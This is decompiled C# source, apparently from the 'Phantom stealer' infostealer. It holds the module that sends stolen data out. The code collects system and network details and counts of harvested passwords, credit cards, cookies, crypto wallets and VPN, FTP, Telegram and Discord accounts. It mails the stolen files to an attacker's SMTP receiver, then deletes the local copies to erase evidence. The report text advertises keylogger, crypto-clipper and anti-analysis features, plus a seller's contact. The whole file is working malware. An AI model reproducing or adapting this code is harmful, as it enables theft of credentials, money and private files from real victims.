using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000AD RID: 173
	internal sealed class SmtpSendLogs
	{
		// Token: 0x06000268 RID: 616 RVA: 0x00018044 File Offset: 0x00016244
		public async Task<bool> UploadFilesAsync()
		{
			int CoEnableSsl = Convert.ToInt32(SmtpSendLogs.Mailenablessl);
			bool EnableSSL = Convert.ToBoolean(CoEnableSsl);
			string text = Config.Version;
			string text2 = SystemInfo.GetSystemVersion();
			string text3 = SystemInfo.Username;
			string text4 = SystemInfo.Compname;
			string text5 = Flags.GetFlag(SystemInfo.Culture.Split(new char[] { '-' })[1]);
			string text6 = SystemInfo.Culture;
			string text7 = SystemInfo.GetAntivirus();
			string text8 = SystemInfo.GetDefaultGateway();
			string text9 = SystemInfo.GetLocalIp();
			TaskAwaiter<string> taskAwaiter = SystemInfo.GetPublicIpAsync().GetAwaiter();
			if (!taskAwaiter.IsCompleted)
			{
				goto IL_07EA;
			}
			IL_00E4:
			string text10 = taskAwaiter.GetResult();
			string info = string.Concat(new string[]
			{
				"\n\ud83d\ude39 *Phantom stealer ",
				text,
				" - Report:*\n━━━━━━━━━━━━━━━━━━━━━━\n\ud83d\udcc5 Date: ",
				SystemInfo.Datenow,
				"\n\ud83d\udda5\ufe0f System: ",
				text2,
				"\n\ud83d\udc64 Username: ",
				text3,
				"\n\ud83d\udcbb CompName: ",
				text4,
				"\n\ud83c\udf10 Language: ",
				text5,
				" ",
				text6,
				"\n\ud83d\udee1\ufe0f Antivirus: ",
				text7,
				"\n\n*NETWORK INFORMATION*\n━━━━━━━━━━━━━━━━━━━━━━\n\ud83c\udf10 Gateway IP: ",
				text8,
				"\n\ud83d\udd12 Internal IP: ",
				text9,
				"\n\ud83c\udf0d External IP: ",
				text10,
				"\n\n*BROWSER RECOVERIES*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udd11 Passwords", Counter.Passwords),
				Counter.GetIValue("\ud83d\udcb3 Credit Cards", Counter.CreditCards),
				Counter.GetIValue("\ud83c\udf6a Cookies", Counter.Cookies),
				Counter.GetIValue("\ud83d\udc5b Wallet Extensions", Counter.BrowserWallets),
				"\n\n*SOFTWARE & ACCOUNTS*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udcb0 Crypto Wallets", Counter.DesktopWallets),
				Counter.GetIValue("\ud83d\udd0c FTP Hosts", Counter.FtpHosts),
				Counter.GetIValue("\ud83d\udd12 VPN Accounts", Counter.Vpn),
				Counter.GetSValue("\ud83d\udce7 Outlook", Counter.Outlook),
				Counter.GetSValue("\ud83d\udce7 FoxMail", Counter.FoxMail),
				Counter.GetSValue("✈\ufe0f Telegram", Counter.Telegram),
				Counter.GetSValue("\ud83d\udc7e Discord", Counter.Discord),
				Counter.GetSValue("\ud83d\udcac WinScp", Counter.WinScp),
				"\n\n*Grabbed Files*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udcb3 Images", Counter.GrabberImages),
				Counter.GetIValue("\ud83d\udcac Documents", Counter.GrabberDocuments),
				Counter.GetIValue("\ud83d\udda5\ufe0f Databases", Counter.GrabberDatabases),
				Counter.GetIValue("\ud83d\udd0c SourceCodes", Counter.GrabberSourceCodes),
				Counter.GetIValue("\ud83d\udcb0 Crypto Wallets", Counter.DesktopWallets),
				Counter.GetIValue("\ud83d\udc5b Wallet Extensions", Counter.BrowserWallets),
				Counter.GetSValue("✈\ufe0f Telegram", Counter.Telegram),
				"\n\n*DEVICE INFORMATION*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetIValue("\ud83d\udce1 WiFi Networks", Counter.SavedWifiNetworks),
				"\n\n*INSTALLATION STATUS*\n━━━━━━━━━━━━━━━━━━━━━━",
				Counter.GetBValue(Config.Startup == "1", "✅ Startup: Enabled", "⛔ Startup: Disabled"),
				Counter.GetBValue(Config.Debug == "1", "✅ Debug Mode: Enabled", "⛔ Debug Mode: Disabled"),
				Counter.GetBValue(Config.AntiAnalysis == "1", "✅ AntiAnalysis: Enabled", "⛔ AntiAnalysis: Disabled"),
				Counter.GetBValue(Config.Keylogger == "1", "✅ Keylogger: Enabled", "⛔ Keylogger: Disabled"),
				Counter.GetBValue(Config.Screenshot == "1", "✅ Screenshot: Enabled", "⛔ Screenshot: Disabled"),
				Counter.GetBValue(Config.ClipperCheckBox == "1", "✅ CryptoClipper: Enabled", "⛔ CryptoClipper: Disabled"),
				Counter.GetBValue(Config.FileGrabberCheckBox == "1", "✅ FileGrabber: Enabled", "⛔ FileGrabber: Disabled"),
				"\n\n Telegram contact https://t.me/Oldphantomoftheopera\n\n website https://www.phantomsoftwares.site/home"
			});
			text = null;
			text2 = null;
			text3 = null;
			text4 = null;
			text5 = null;
			text6 = null;
			text7 = null;
			text8 = null;
			text9 = null;
			text10 = null;
			try
			{
				using (MailMessage message = new MailMessage())
				{
					message.To.Add(SmtpSendLogs.Mailreceiver);
					message.From = new MailAddress(SmtpSendLogs.Mailsender);
					message.Subject = SmtpSendLogs.Mailsubject;
					message.Body = info;
					string[] files = (from f in Directory.GetFiles(Paths.InitWorkDir(), "*.*", SearchOption.TopDirectoryOnly)
						where f.EndsWith(".txt", StringComparison.OrdinalIgnoreCase) || f.EndsWith(".png", StringComparison.OrdinalIgnoreCase) || f.EndsWith(".json", StringComparison.OrdinalIgnoreCase)
						select f).ToArray<string>();
					foreach (string file in files)
					{
						string extension = Path.GetExtension(file).ToLower();
						string text11 = extension;
						string text12 = text11;
						Attachment attachment;
						if (!(text12 == ".txt"))
						{
							if (!(text12 == ".png"))
							{
								if (!(text12 == ".json"))
								{
									attachment = new Attachment(file, "application/octet-stream");
								}
								else
								{
									attachment = new Attachment(file, new ContentType("application/json"));
								}
							}
							else
							{
								attachment = new Attachment(file, new ContentType("image/png"));
							}
						}
						else
						{
							attachment = new Attachment(file, "text/plain");
						}
						text11 = null;
						message.Attachments.Add(attachment);
						extension = null;
						attachment = null;
						file = null;
					}
					string[] array = null;
					using (SmtpClient client = new SmtpClient(SmtpSendLogs.Mailserver))
					{
						client.UseDefaultCredentials = false;
						client.Credentials = new NetworkCredential(SmtpSendLogs.Mailsender, SmtpSendLogs.Mailpassword);
						client.Port = Convert.ToInt32(SmtpSendLogs.Mailport);
						client.EnableSsl = EnableSSL;
						client.DeliveryMethod = SmtpDeliveryMethod.Network;
						await client.SendMailAsync(message);
					}
					SmtpClient client = null;
					files = null;
				}
				MailMessage message = null;
				return true;
			}
			catch (Exception ex)
			{
				Logging.Log("Email sending failed: " + ex.Message, true);
				return false;
			}
			IL_07EA:
			await taskAwaiter;
			TaskAwaiter<string> taskAwaiter2;
			taskAwaiter = taskAwaiter2;
			taskAwaiter2 = default(TaskAwaiter<string>);
			goto IL_00E4;
		}

		// Token: 0x06000269 RID: 617 RVA: 0x00018088 File Offset: 0x00016288
		public static async Task SendReportAsync(string file = null)
		{
			Logging.Log("Sending logs to Smtp", true);
			SmtpSendLogs SmtpHelper = new SmtpSendLogs();
			bool flag = await SmtpHelper.UploadFilesAsync();
			bool uploadResponses = flag;
			if (uploadResponses)
			{
				Logging.Log("Logs Sent to Smtp", true);
			}
			else
			{
				Logging.Log("Logs failed to send", true);
			}
			string workDir = Paths.InitWorkDir();
			string[] filesToDelete = (from f in Directory.GetFiles(workDir)
				where new string[] { ".txt", ".png", ".json" }.Contains(Path.GetExtension(f).ToLower())
				select f).ToArray<string>();
			foreach (string fileToDelete in filesToDelete)
			{
				try
				{
					Logging.Log("Deleting any evidence of files", true);
					File.Delete(fileToDelete);
					Logging.Log("Deleted: " + fileToDelete, true);
				}
				catch (Exception ex)
				{
					Logging.Log("Failed to delete " + fileToDelete + ": " + ex.Message, true);
				}
				fileToDelete = null;
			}
			string[] array = null;
		}

		// Token: 0x0600026A RID: 618 RVA: 0x000038B4 File Offset: 0x00001AB4
		public SmtpSendLogs()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x0600026B RID: 619 RVA: 0x000180CC File Offset: 0x000162CC
		static SmtpSendLogs()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			SmtpSendLogs.Mailsender = Config.SmtpSender;
			SmtpSendLogs.Mailreceiver = Config.SmtpReceiver;
			SmtpSendLogs.Mailserver = Config.SmtpServer;
			SmtpSendLogs.Mailpassword = Config.SmtpPassword;
			SmtpSendLogs.Mailport = Config.SmtpPort;
			SmtpSendLogs.Mailenablessl = Config.CbEnableSsl;
			SmtpSendLogs.Mailsubject = string.Concat(new string[]
			{
				Environment.UserName,
				"/ ",
				Environment.MachineName,
				" - ",
				DateTime.Now.Month.ToString(),
				".",
				DateTime.Now.Day.ToString(),
				".",
				DateTime.Now.Year.ToString()
			});
		}

		// Token: 0x04000526 RID: 1318
		private static string Mailsender;

		// Token: 0x04000527 RID: 1319
		private static string Mailreceiver;

		// Token: 0x04000528 RID: 1320
		private static string Mailserver;

		// Token: 0x04000529 RID: 1321
		private static string Mailpassword;

		// Token: 0x0400052A RID: 1322
		private static string Mailport;

		// Token: 0x0400052B RID: 1323
		private static string Mailenablessl;

		// Token: 0x0400052C RID: 1324
		private static string Mailsubject;
	}
}
